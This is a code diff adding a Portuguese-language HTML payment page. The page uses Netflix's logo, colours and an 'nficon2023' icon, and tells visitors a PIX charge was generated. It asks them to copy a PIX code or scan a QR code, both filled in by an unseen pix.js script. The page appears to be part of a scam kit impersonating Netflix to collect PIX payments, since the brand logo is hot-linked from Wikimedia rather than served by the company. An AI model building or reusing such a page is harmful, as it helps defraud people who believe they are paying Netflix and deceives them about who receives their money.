@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Pagamento</title>
+    <link rel="icon" href="/assets/icons/nficon2023.ico" type="image/x-icon"> 
+    <link rel="stylesheet" href="/assets/css/gerar.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+    <style> 
+        .swal2-popup {
+            font-family: 'Arial', sans-serif;  
+            color: #fff;
+            background-color: #141414;  
+        }
+        .swal2-title {
+            color: #e50914;  
+        }
+        .swal2-html-container {
+            color: #fff;  
+        }
+        .swal2-confirm {
+            background-color: #e50914;  
+            border: none;
+            color: #fff;
+        }
+        .swal2-cancel {
+            background-color: #333;  
+            border: none;
+            color: #fff;
+        }
+        .swal2-confirm:hover, .swal2-cancel:hover {
+            filter: brightness(1.1);  
+        }
+        .swal2-icon {
+            color: #e50914; 
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+    </header>
+    <div class="container">
+        <header class="headeres">
+            <h1>Detalhes do Pagamento</h1>
+        </header>
+        <div class="payment-details">
+           
+            <center><p><strong>PIX gerado com sucesso!</strong></p></center>
+            <div class="payment-info">
+                <p><strong>Siga as instruções para realizar o pagamento:</strong></p>
+                <p>1- Copie o código abaixo:</p>
+                <input type="text" id="pix-code" readonly>
+                <button id="copy-code-btn">COPIAR CÓDIGO</button>
+                <p>2- Cole no seu banco na função <strong>PIX Copia e Cola</strong></p>
+                <p><strong>Você também pode pagar utilizando o QR Code:</strong></p>
+                <div class="qrcode-container">
+                    <div id="qrcode"></div>
+                </div>
+                <p>1 - Acesse sua conta bancária no internet banking ou através do app.</p>
+                <p>2 - Selecione a opção de pagar com PIX / escanear QR Code.</p>
+                <p>3 - Finalize o pagamento.</p>
+            </div>
+        </div>
+        <footer class="footer">
+            <button id="continue-btn" class="continue-button">Voltar ao Início</button>
+        </footer>
+    </div>
+
+    <script>
+
+    </script>
+     <script src="/assets/js/pix.js"></script>
+</body>
+</html>
